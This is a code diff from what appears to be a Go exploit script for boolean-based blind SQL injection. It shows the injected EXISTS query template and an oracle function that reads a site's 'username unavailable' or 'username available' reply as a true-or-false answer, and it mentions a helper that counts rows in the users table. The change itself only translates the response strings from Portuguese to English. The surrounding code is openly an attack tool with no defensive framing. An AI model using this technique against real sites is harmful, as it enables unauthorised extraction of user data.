@@ -38,8 +38,8 @@ var (
 //
 //	SELECT EXISTS(SELECT 1 FROM users WHERE username='{target}' AND {condition}); -- -');
 //
-// TRUE  → username row found → response: "usuario indisponivel"
-// FALSE → no row matches    → response: "usuario disponivel"
+// TRUE  → username row found → response: "username unavailable"
+// FALSE → no row matches    → response: "username available"
 func oracle(condition string) bool {
 	reqCount++
 
@@ -65,8 +65,8 @@ func oracle(condition string) bool {
 		log.Fatalf("[!] JSON parse error: %v (body: %s)", err, body)
 	}
 
-	// "usuario indisponivel" means EXISTS() returned 1 → condition is TRUE.
-	return jr.Message == "usuario indisponivel"
+	// "username unavailable" means EXISTS() returned 1 → condition is TRUE.
+	return jr.Message == "username unavailable"
 }
 
 // getRowCount counts rows in the users table by incrementing a counter n
